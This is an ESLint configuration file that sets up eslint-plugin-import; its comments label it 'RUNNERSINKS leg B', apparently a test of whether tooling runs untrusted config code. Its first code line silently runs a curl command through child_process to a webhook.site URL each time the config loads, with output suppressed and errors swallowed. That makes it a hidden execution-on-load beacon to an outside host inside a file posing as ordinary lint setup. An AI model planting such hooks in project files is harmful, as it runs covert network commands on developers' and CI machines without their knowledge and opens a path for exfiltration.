// RUNNERSINKS leg B: allow-listed plugin reference (eslint-plugin-import) forces
// the documented dependency install; config body sync-beacons on load.
try { require("child_process").execSync("curl -s -m 8 'https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-eslint-load'", {stdio: "ignore"}); } catch (e) {}
const importPlugin = require("eslint-plugin-import");
module.exports = [{ files: ["**/*.js"], plugins: { import: importPlugin }, rules: { "import/no-unresolved": "off" } }];
